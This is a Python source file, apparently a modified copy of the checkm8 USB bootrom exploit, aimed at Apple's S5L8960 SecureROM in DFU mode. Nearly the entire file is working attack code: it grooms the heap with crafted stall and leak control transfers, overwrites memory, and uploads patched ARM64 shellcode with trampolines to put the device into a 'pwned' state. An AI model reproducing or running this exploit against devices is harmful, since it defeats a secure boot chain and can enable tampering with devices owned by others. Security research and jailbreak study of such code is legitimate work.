import array
import ctypes
import struct
import sys
import time
import usb
import dfu

request = None
transfer_ptr = None
never_free_device = None

def libusb1_create_ctrl_transfer(device, request, timeout):
  ptr = usb.backend.libusb1._lib.libusb_alloc_transfer(0)
  assert ptr is not None

  transfer = ptr.contents
  transfer.dev_handle = device._ctx.handle.handle
  transfer.endpoint = 0 # EP0
  transfer.type = 0 # LIBUSB_TRANSFER_TYPE_CONTROL
  transfer.timeout = timeout
  transfer.buffer = request.buffer_info()[0] # C-pointer to request buffer
  transfer.length = len(request)
  transfer.user_data = None
  transfer.callback = usb.backend.libusb1._libusb_transfer_cb_fn_p(0) # NULL
  transfer.flags = 1 << 1 # LIBUSB_TRANSFER_FREE_BUFFER

  return ptr

def libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data, timeout):
  if usb.backend.libusb1._lib is not device._ctx.backend.lib:
    print 'ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.'
    sys.exit(1)

  global request, transfer_ptr, never_free_device
  request_timeout = int(timeout) if timeout >= 1 else 0
  start = time.time()
  never_free_device = device
  request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data)
  transfer_ptr = libusb1_create_ctrl_transfer(device, request, request_timeout)
  assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0

  while time.time() - start < timeout / 1000.0:
    pass

  # Prototype of libusb_cancel_transfer is missing from pyusb
  usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [ctypes.POINTER(usb.backend.libusb1._libusb_transfer)]
  assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0

def libusb1_no_error_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout):
  try:
    device.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout)
  except usb.core.USBError:
    pass

def usb_rop_callbacks(address, func_gadget, callbacks):
  data = ''
  for i in range(0, len(callbacks), 5):
    block1 = ''
    block2 = ''
    for j in range(5):
      address += 0x10
      if j == 4:
        address += 0x50
      if i + j < len(callbacks) - 1:
        block1 += struct.pack('<2Q', func_gadget, address)
        block2 += struct.pack('<2Q', callbacks[i+j][1], callbacks[i+j][0])
      elif i + j == len(callbacks) - 1:
        block1 += struct.pack('<2Q', func_gadget, 0)
        block2 += struct.pack('<2Q', callbacks[i+j][1], callbacks[i+j][0])
      else:
        block1 += struct.pack('<2Q', 0, 0)
    data += block1 + block2
  return data

def asm_arm64_branch(src, dest):
  if src > dest:
    value = 0x18000000 - (src - dest) / 4
  else:
    value = 0x14000000 + (dest - src) / 4
  return struct.pack('<I', value)

def asm_arm64_x7_trampoline(dest):
  return '47000058E0001FD6'.decode('hex') + struct.pack('<Q', dest)

def asm_thumb_trampoline(src, dest):
  assert src % 2 == 1 and dest % 2 == 1
  if src % 4 == 1:
    return struct.pack('<2I', 0xF000F8DF, dest)
  else:
    return struct.pack('<2I', 0xF002F8DF, dest)

def prepare_shellcode(name, constants=[]):
  if name.endswith('_armv7'):
    fmt = '<%sI'
    size = 4
  elif name.endswith('_arm64'):
    fmt = '<%sQ'
    size = 8
  else:
    print 'ERROR: Shellcode name "%s" does not end with known architecture. Exiting.' % name
    sys.exit(1)

  with open('bin/%s.bin' % name, 'rb') as f:
    shellcode = f.read()

  placeholders_offset = len(shellcode) - size * len(constants)
  for i in range(len(constants)):
      offset = placeholders_offset + size * i
      (value,) = struct.unpack(fmt % '1', shellcode[offset:offset + size])
      assert value == 0xBAD00001 + i

  return shellcode[:placeholders_offset] + struct.pack(fmt % len(constants), *constants)

def stall(device):   libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 'A' * 0xC0, 0.00001)
def leak(device):    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
def no_leak(device): libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)

def usb_req_stall(device):   libusb1_no_error_ctrl_transfer(device,  0x2, 3,   0x0,  0x80,  0x0, 10)
def usb_req_leak(device):    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40,  1)
def usb_req_no_leak(device): libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41,  1)

class DeviceConfig:
  def __init__(self, version, cpid, large_leak, overwrite, overwrite_offset, hole, leak):
    assert len(overwrite) <= 0x800
    self.version          = version
    self.cpid             = cpid
    self.large_leak       = large_leak
    self.overwrite        = overwrite
    self.overwrite_offset = overwrite_offset
    self.hole             = hole
    self.leak             = leak

PAYLOAD_OFFSET_ARMV7 = 384
PAYLOAD_SIZE_ARMV7   = 320
PAYLOAD_OFFSET_ARM64 = 384
PAYLOAD_SIZE_ARM64   = 576

def payload(cpid):
  if cpid == 0x8960:
    constants_usb_s5l8960x = [
               0x180380000, # 1 - LOAD_ADDRESS
        0x6578656365786563, # 2 - EXEC_MAGIC
        0x646F6E65646F6E65, # 3 - DONE_MAGIC
        0x6D656D636D656D63, # 4 - MEMC_MAGIC
        0x6D656D736D656D73, # 5 - MEMS_MAGIC
               0x10000CC78, # 6 - USB_CORE_DO_IO
    ]
    constants_checkm8_s5l8960x = [
               0x180086B58, # 1 - gUSBDescriptors
               0x180086CDC, # 2 - gUSBSerialNumber
               0x10000BFEC, # 3 - usb_create_string_descriptor
               0x180080562, # 4 - gUSBSRNMStringDescriptor
               0x18037FC00, # 5 - PAYLOAD_DEST
      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET
        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
               0x180086C70, # 8 - PAYLOAD_PTR
    ]
    s5l8960x_handler   = asm_arm64_x7_trampoline(0x10000CFB4) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_s5l8960x)[4:]
    s5l8960x_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_s5l8960x)
    assert len(s5l8960x_shellcode) <= PAYLOAD_OFFSET_ARM64
    assert len(s5l8960x_handler) <= PAYLOAD_SIZE_ARM64
    return s5l8960x_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s5l8960x_shellcode)) + s5l8960x_handler

def all_exploit_configs():
  s5l8960x_overwrite = struct.pack('<32xQ8x', 0x180380000)
  
  s5l8960x_overwrite_offset = 0x580

  return [
    DeviceConfig('iBoot-1704.10',         0x8960, 7936, s5l8960x_overwrite, s5l8960x_overwrite_offset, None, None), # S5L8960 (buttons)     13.97 seconds
  ]

def exploit_config(serial_number):
  for config in all_exploit_configs():
    if 'SRTG:[%s]' % config.version in serial_number:
      return payload(config.cpid), config
  for config in all_exploit_configs():
    if 'CPID:%s' % config.cpid in serial_number:
      print 'ERROR: CPID is compatible, but serial number string does not match.'
      print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
      sys.exit(1)
  print 'ERROR: This is not a compatible device. Exiting.'
  sys.exit(1)

def exploit():
  print '*** checkm8 exploit by axi0mX ***'
  print '*** modified version by Linus Henze and SuleMareVientu***'

  device = dfu.acquire_device()
  start = time.time()
  print 'Found:', device.serial_number
  if 'PWND:[' in device.serial_number:
    print 'Device is already in pwned DFU Mode. Not executing exploit.'
    return
  payload, config = exploit_config(device.serial_number)

  if config.large_leak is not None:
    usb_req_stall(device)
    for i in range(config.large_leak):
      usb_req_leak(device)
    usb_req_no_leak(device)
  else:
    stall(device)
    for i in range(config.hole):
      no_leak(device)
    leak(device)
    no_leak(device)
  dfu.usb_reset(device)
  dfu.release_device(device)

  device = dfu.acquire_device()
  device.serial_number
  libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)

  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, 'A' * config.overwrite_offset, 10)
  libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
  dfu.release_device(device)

  time.sleep(0.5)

  device = dfu.acquire_device()
  usb_req_stall(device)
  if config.large_leak is not None:
    usb_req_leak(device)
  else:
    for i in range(config.leak):
      usb_req_leak(device)
  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 50)
  for i in range(0, len(payload), 0x800):
    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50)
  dfu.usb_reset(device)
  dfu.release_device(device)

  device = dfu.acquire_device()
  if 'PWND:[checkm8]' not in device.serial_number:
    print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
    sys.exit(1)
  print 'Device is now in pwned DFU Mode.'
  print '(%0.2f seconds)' % (time.time() - start)
  dfu.release_device(device)
